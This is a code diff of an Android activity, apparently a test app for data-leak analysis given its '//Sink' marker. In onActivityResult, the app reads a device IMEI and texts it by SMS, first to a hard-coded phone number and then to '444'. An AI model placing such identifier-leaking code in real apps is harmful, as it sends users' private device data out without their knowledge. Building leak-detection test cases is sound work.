@@ -16,17 +16,11 @@ public class MainActivity extends AppCompatActivity {
     }
 
     @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data)
+    protected void onActivityResult(int requestCode, int resultCode, Intent imeiData)
     {
-                String imei=data.getStringExtra("result");
-                SmsManager sms = SmsManager.getDefault();
-                sms.sendTextMessage("4193784172", null, imei, null, null);
-    }
-
-    public void sendImei(String imei)
-    {
+        String imei=imeiData.getStringExtra("result");
         SmsManager sms = SmsManager.getDefault();
-        sms.sendTextMessage("4193784172", null, imei, null, null);  //Sink
+        sms.sendTextMessage("444", null, imei, null, null);
     }
 
 }
